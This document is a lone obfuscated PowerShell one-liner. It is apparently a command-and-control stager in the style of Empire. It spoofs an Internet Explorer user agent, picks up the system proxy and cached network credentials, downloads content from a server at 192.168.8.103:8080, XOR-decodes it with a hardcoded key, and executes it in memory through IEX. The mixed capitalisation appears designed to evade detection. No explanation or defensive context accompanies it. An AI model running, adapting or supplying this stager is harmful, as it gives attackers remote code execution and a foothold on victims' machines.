
$wc=NEW-ObjEct SysTEM.Net.WEbCLIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAdErS.ADD('User-Agent',$u);$wC.ProXy = [SYsTEM.NET.WEBREQuesT]::DEFAUltWEbProxY;$wC.PROXY.CREdenTiaLS = [SYSTem.NeT.CreDEntIALCAcHE]::DEfaULTNeTWorkCREdEnTialS;$K='e8f9578e2966fb2fa1ed5a0b15a4531c';$i=0;[cHar[]]$B=([ChAr[]]($wc.DownLOAdSTrinG("http://192.168.8.103:8080/index.asp")))|%{$_-bXOR$K[$I++%$K.LEnGtH]};IEX ($b-joIn'')

